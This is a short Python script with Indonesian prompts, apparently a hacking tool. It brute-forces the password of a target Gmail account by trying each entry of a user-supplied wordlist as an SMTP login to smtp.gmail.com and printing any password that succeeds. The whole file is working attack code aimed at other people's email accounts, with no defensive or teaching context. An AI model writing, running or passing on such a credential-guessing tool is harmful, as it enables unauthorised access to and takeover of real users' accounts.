import smtplib
import time

class bcolors:
    UNGU = '\033[95m'
    BIRU = '\033[94m'
    HIJAU = '\033[92m'
    KUNING = '\033[93m'
    MERAH = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def bruteEmail():
  counter = 1
  smtpserver = smtplib.SMTP("smtp.gmail.com",587)
  smtpserver.ehlo()
  smtpserver.starttls()

  user = input("Masukkan email target :")
  passfile = input("Masukkan tempat file worldlist:")
  passfile = open(passfile,'r')

  try:
    for password in passfile:
        try:
            smtpserver.login(user, password)
            print (bcolors.HIJAU,"[+] Password di temukan ====> ",password)
        except smtplib.SMTPAuthenticationError:
            print (bcolors.MERAH,f"[!] Password tidak di temukan {counter} {password}")
            time.sleep(0.1)
            counter += 1
            print (bcolors.ENDC," ")

  except KeyboardInterrupt:
    print ('Stop')

